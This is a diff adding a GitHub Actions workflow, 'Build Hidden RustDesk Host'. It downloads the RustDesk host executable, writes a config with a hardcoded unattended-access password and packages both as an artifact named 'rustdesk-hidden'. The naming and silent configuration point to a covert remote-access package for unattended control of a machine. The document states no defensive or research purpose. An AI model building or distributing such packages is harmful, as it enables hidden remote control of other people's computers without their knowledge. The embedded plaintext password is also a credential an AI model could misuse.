@@ -1,1 +1,36 @@
 
+name: Build Hidden RustDesk Host
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v2
+
+    - name: Download RustDesk Host
+      run: |
+        Invoke-WebRequest -Uri "https://github.com/rustdesk/rustdesk/releases/latest/download/rustdesk-host.exe" -OutFile "rustdesk-host.exe"
+
+    - name: Configure installer silently
+      run: |
+        $content = @"
+        [config]
+        unattended_password = "Sswc2025."
+        "@
+        Set-Content -Path "rustdesk.conf" -Value $content
+
+    - name: Package installer
+      run: |
+        mkdir output
+        copy rustdesk-host.exe output/
+        copy rustdesk.conf output/
+
+    - name: Upload artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: rustdesk-hidden
+        path: output
